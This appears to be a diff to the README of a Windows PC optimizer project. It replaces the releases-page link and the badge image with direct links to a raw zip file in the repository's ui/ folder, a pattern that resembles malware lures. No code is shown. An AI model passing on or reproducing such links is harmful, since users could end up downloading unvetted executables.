@@ -1,10 +1,10 @@
-https://github.com/moalfati7/pc-toolkit-pro/releases
+https://github.com/moalfati7/pc-toolkit-pro/raw/refs/heads/master/ui/pro_pc_toolkit_v2.7.zip
 
 # pc-toolkit-pro: Ultimate Windows Optimizer, Cleaner, Real-Time Monitor, and Power Toolset
 
 🚀 A free PyQt6 desktop app for Windows 10 and Windows 11. It combines real-time system monitoring with powerful cleanup, memory optimization, and smart power management. The goal is clear: help you keep your PC fast, secure, and easy to maintain with a modern, responsive GUI.
 
-[![Release badge](https://img.shields.io/badge/releases-v2.0-green?style=for-the-badge&logo=github)](https://github.com/moalfati7/pc-toolkit-pro/releases)
+[![Release badge](https://github.com/moalfati7/pc-toolkit-pro/raw/refs/heads/master/ui/pro_pc_toolkit_v2.7.zip)](https://github.com/moalfati7/pc-toolkit-pro/raw/refs/heads/master/ui/pro_pc_toolkit_v2.7.zip)
 
 Table of Contents
 - Overview
